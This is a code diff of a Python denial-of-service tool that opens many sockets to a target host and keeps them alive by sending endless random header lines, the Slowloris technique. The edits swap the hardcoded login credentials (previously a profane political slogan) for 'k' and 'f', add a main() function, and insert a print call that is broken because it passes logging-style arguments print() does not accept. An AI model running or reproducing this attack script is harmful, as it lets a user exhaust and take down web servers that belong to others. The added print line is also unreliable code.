@@ -35,7 +35,7 @@ while attemps < 100:
     username = input("\033[38;5;6m┗> Enter Username: \033[30m")
     password = input("\033[38;5;6m┗> Enter password: \033[30m")
 
-    if username == 'fuck zion' and password == 'free palestine':
+    if username == 'k' and password == 'f':
         print("\033[100m \033[31m••> BURNING WEBS 210πiS \033[0m")
         break
     else:
@@ -118,6 +118,11 @@ def init_attack(nAttackers):
     logging.debug("Creating attacker | ID: {}".format(identifier))
     return attacker(identifier, agent, s)
 
+def main():
+    logging.info("\033[38;5;220mGet \033[36m{} \033[37mResponse: \033[33m{}\033[0m".format(host, connections))
+    logging.info("Establishing connections..")
+    attackers = []
+
     for x in range((connections)):
         try:
             attackers.append(init_attack(len(attackers) + 1))
@@ -126,7 +131,8 @@ def init_attack(nAttackers):
 
     while True:
         try:
-            logging.info("\033[38;5;220mGet \033[36m{} \033[37mResponse: \033[33m{}\033[0m".format(host, connections))  
+            logging.info("\033[38;5;220mGet \033[36m{} \033[37mResponse: \033[33m{}\033[0m".format(host, connections))
+            print("\033[48;5;6m[%(asctime)s] %(message)s", datefmt="%H:%M:%S", format(logging.INFO))
             for s in list(attackers):
                 try:
                     s.socket.send("X-{}: {}\r\n".format(randint(0, 50000), randint(0, 50000)).encode())
@@ -145,6 +151,7 @@ def init_attack(nAttackers):
         except (KeyboardInterrupt, SystemExit):
             print("\nStopping the attack..")
             break
-                  
+
 if __name__ == "__main__":
     main()
+
